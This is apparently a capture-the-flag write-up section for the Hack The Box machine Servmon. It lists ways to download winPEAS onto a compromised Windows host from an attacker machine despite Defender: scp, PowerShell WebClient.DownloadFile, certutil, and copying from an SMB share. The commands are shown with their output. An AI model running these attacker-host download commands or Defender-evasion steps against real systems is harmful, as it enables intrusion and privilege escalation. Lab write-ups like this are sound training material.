# File transfer on Windows (with Defender enabled)

### scp on Windows

Since OpenSSH is installed and running we can make use of the installed `scp` client, to connect to Kali and download the file

```shell
nadine@SERVMON C:\Users\Nadine\Downloads>scp root@10.10.14.27:~/HTB/Servmon/winPEAS.exe winPEAS.exe
root@10.10.14.27's password:
winPEAS.exe                                                                                                         100%  226KB 202.0KB/s   00:01     

nadine@SERVMON C:\Users\Nadine\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Downloads

02/09/2020  08:12    <DIR>          .
02/09/2020  08:12    <DIR>          ..
02/09/2020  08:12           231,424 winPEAS.exe
               1 File(s)        231,424 bytes
               2 Dir(s)  27,524,366,336 bytes free
```

### Powershell `Net.WebClient.DownloadFile` method

```shell
nadine@SERVMON C:\Users\Nadine\Downloads>powershell.exe "(New-Object Net.WebClient).DownloadFile('http://10.10.14.27/winPEAS.exe','C:\Users\Nadine\Downloads\winPEAS.exe')"

nadine@SERVMON C:\Users\Nadine\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Downloads

02/09/2020  08:20    <DIR>          .
02/09/2020  08:20    <DIR>          ..
02/09/2020  08:20           231,424 winPEAS.exe
               1 File(s)        231,424 bytes
               2 Dir(s)  27,523,268,608 bytes free
```

## (Partly) unsuccessful methods

### certutil

Pity this didn't work. certutil used to work pretty well across a whole range of Windows versions.

```shell
nadine@SERVMON C:\Users\Nadine\Downloads>certutil -f -split -urlcache http://10.10.14.27/winPEAS.exe winPEAS.exe
Access is denied.
```

### Impacket's **smbserver.py**

This works only if the file in question passes Defender's checks. While searching for a working [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) binary, I stumbled across some that worked and some that didn't.

```shell
nadine@SERVMON C:\Users\Nadine\Downloads>copy \\10.10.14.27\servmon\winPEAS.exe .
        1 file(s) copied.

nadine@SERVMON C:\Users\Nadine\Downloads>copy \\10.10.14.27\servmon\winPEASany.exe .
Operation did not complete successfully because the file contains a virus or potentially unwanted software.
        0 file(s) copied.
```

